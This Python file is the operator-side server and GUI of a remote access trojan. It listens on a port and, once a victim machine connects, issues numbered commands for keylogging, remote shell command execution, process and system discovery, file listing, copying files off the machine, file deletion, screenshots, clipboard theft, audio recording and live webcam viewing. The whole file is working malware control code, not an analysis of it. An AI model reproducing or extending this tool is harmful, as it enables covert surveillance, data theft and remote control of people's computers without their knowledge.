import socket
import sys
import pickle
import struct
import cv2
from datetime import datetime
from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QApplication, QInputDialog
import window
import os
# SERVER = socket.ge    thostbyname_ex(socket.gethostname())[-1][-1]  # Standard loopback interface address (localhost)
SERVER = ""
PORT = 8888        # Port to listen on (non-privileged ports are > 1023)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((SERVER, PORT))


class Program(QtWidgets.QMainWindow):
    def __init__(self):
        super(Program, self).__init__()
        self.ui = window.Ui_MainWindow()
        self.ui.setupUi(self)
        self.conn, self.addr = server.accept()
        self.ui.input_capture.clicked.connect(self.input_capture_f)
        self.ui.process_discovery.clicked.connect(self.process_discovery_f)
        self.ui.command_line_interface.clicked.connect(self.command_line_interface_f)
        self.ui.system_info_discovery.clicked.connect(self.system_information_discovery_f)
        self.ui.file_and_directory_discovery.clicked.connect(self.file_and_directory_discovery_f)
        self.ui.remote_file_copy.clicked.connect(self.remote_file_copy_f)
        self.ui.file_deletion.clicked.connect(self.file_deletion_f)
        self.ui.screen_capture.clicked.connect(self.screen_capture_f)
        self.ui.clipboard_data.clicked.connect(self.clipboard_data_f)
        self.ui.audio_capture.clicked.connect(self.audio_capture_f)
        self.ui.video_capture.clicked.connect(self.video_capture_f)
        self.ui.remove_client.clicked.connect(self.remove)

    def input_capture_f(self):
        self.conn.send("1".encode())
        a = ''
        with open("key_log.txt", 'a') as f:
            while True:
                data = self.conn.recv(1024).decode()
                a += data
                f.write(data)
                if not data or "done" in data:
                    break
        self.ui.textBrowser.setText(
            "INPUT CAPTURE\n" +
            "==================================\n" + a)

    def process_discovery_f(self):
        self.conn.send("2".encode())
        now = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
        a = ''
        with open("process_" + now + ".txt", "wb") as f:
            while True:
                data = self.conn.recv(2048)
                a += data.decode()
                f.write(data)
                if len(data) < 2048:
                    print("done")
                    break
            print(a)
            self.ui.textBrowser.setText(
                "PROCESS DISCOVERY\n" +
                "==================================\n" +
                f"List of processes saved in {f.name}\n" +
                "==================================\n" + a)

    def command_line_interface_f(self):
        self.conn.send("3".encode())
        command, answer = QInputDialog.getText(self, 'command', 'Enter the command: ')
        print(answer)
        if command == "":
            self.ui.textBrowser.setText("Try again")
        else:
            self.conn.send(command.encode())
            msg = self.conn.recv(4096).decode()

            self.ui.textBrowser.setText("COMMAND EXECUTION\n" +
                "==================================\n" +
                "Command: " + command + "\n" +
                "==================================\n" + msg)

    def system_information_discovery_f(self):
        self.conn.send("4".encode())
        now = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
        a = ''
        with open("sys_info_" + now + ".txt", "wb") as f:
            while True:
                # print("b")
                data = self.conn.recv(2048)
                a += data.decode()
                # print("c")
                f.write(data)
                if len(data) < 2048:
                    print("done")
                    break
            print(a)
            # print("continue")
            self.ui.textBrowser.setText(
                "SYSTEM INFO\n" +
                "==================================\n" +
                f"System info saved in {f.name}\n" +
                "==================================\n" + a)

    def file_and_directory_discovery_f(self):
        self.conn.send("5".encode())
        dir, answer = QInputDialog.getText(self, 'Dir', 'Enter the directory: ')
        if dir == "":
            self.ui.textBrowser.setText("Try again")
        else:
            self.conn.send(dir.encode())
            a = ''
            dir = dir.replace(':', '').replace('\\', '-').replace('"', '').replace('//', '-')
            with open(dir + ".txt", "wb") as f:
                while True:
                    msg = self.conn.recv(2048)
                    print(msg)
                    a += msg.decode()
                    f.write(msg)
                    # if not msg or b'!done' in msg:
                    if len(msg) < 2048:
                        print("done")
                        break
                self.ui.textBrowser.setText(
                    "DIRECTORY DISCOVERY\n" +
                    "==================================\n" +
                    f"Info saved in {f.name}\n" +
                    "==================================\n" + a)

    def remote_file_copy_f(self):
        self.conn.send("6".encode())
        dir, answer = QInputDialog.getText(self, 'File to copy', 'Enter the file path: ')
        if dir == "":
            self.ui.textBrowser.setText("Try again")
        else:
            self.conn.send(dir.encode())
            file_name = os.path.basename(dir)
            with open(file_name, "wb") as f:
                while True:
                    data = self.conn.recv(2048)
                    print(data)
                    f.write(data)
                    # if not data or b'!done' in data:
                    if len(data) < 2048:
                        break
            self.ui.textBrowser.setText("FILE COPY\n" +
                    "==================================\n" +
                    f"{dir} copied\n" +
                    "==================================\n")

    def file_deletion_f(self):
        self.conn.send("7".encode())
        dir, answer = QInputDialog.getText(self, 'File to delete', 'Enter the file path: ')
        if dir == "":
            self.ui.textBrowser.setText("Invalid path")
        else:
            self.conn.send(dir.encode())
            msg = self.conn.recv(2048).decode()
            print(msg)
            self.ui.textBrowser.setText("FILE DELETION\n" +
                    "==================================\n" +
                    "==================================\n" + msg)

    def screen_capture_f(self):
        self.conn.send("8".encode())
        now = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
        filename = now + '.png'
        file = open("screenshot_" + filename, "wb")
        while True:
            image = self.conn.recv(2048)
            if not image or b' done' in image:
                break
            else:
                file.write(image)
        msg = "Saved as " + filename
        self.ui.textBrowser.setText("SCREEN CAPTURE\n" +
                    "==================================\n" + msg)

    def clipboard_data_f(self):
        self.conn.send("9".encode())
        a = ''
        with open("clipboard_data.txt", "wb") as f:
            while True:
                data = self.conn.recv(1024)
                a += data.decode()
                f.write(data)
                # if not data or b'!done' in data:
                if len(data) < 1024:
                    print("done")
                    break
            print(a)
            # print("continue")
            self.ui.textBrowser.setText(
                "CLIPBOARD DATA\n" +
                "==================================\n" +
                f"CLIPBOARD DATA saved in {f.name}\n" +
                "==================================\n" + a)

    def audio_capture_f(self):
        self.conn.send("10".encode())
        now = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
        with open('audio_' + now + '.wav', 'wb') as f:
            while True:
                audio = self.conn.recv(2048)

                if not audio or b'!done' in audio:
                    break
                f.write(audio)
        self.ui.textBrowser.setText(f"Audio saved as {f.name}")

    def video_capture_f(self):
        self.conn.send("11".encode())
        data = b""
        payload_size = struct.calcsize("Q")
        while True:
            while len(data) < payload_size:
                packet = self.conn.recv(4 * 1024)  # 4K
                if not packet: break
                data += packet
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack("Q", packed_msg_size)[0]
            while len(data) < msg_size:
                data += self.conn.recv(4 * 1024)
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame = pickle.loads(frame_data)
            cv2.imshow(f"Received", frame)
            key = cv2.waitKey(1) & 0xFF
            if key == ord('q'):
                break

    def remove(self):
        self.conn.send("12".encode())
        self.ui.textBrowser.setText(f"Client deleted")


def start():
    server.listen()
    print("Waiting for connection... ")
    app = QApplication(sys.argv)
    window = Program()
    widget = QtWidgets.QStackedWidget()
    widget.addWidget(window)
    widget.setFixedWidth(1080)
    widget.setFixedHeight(725)
    widget.show()
    app.exec_()


start()

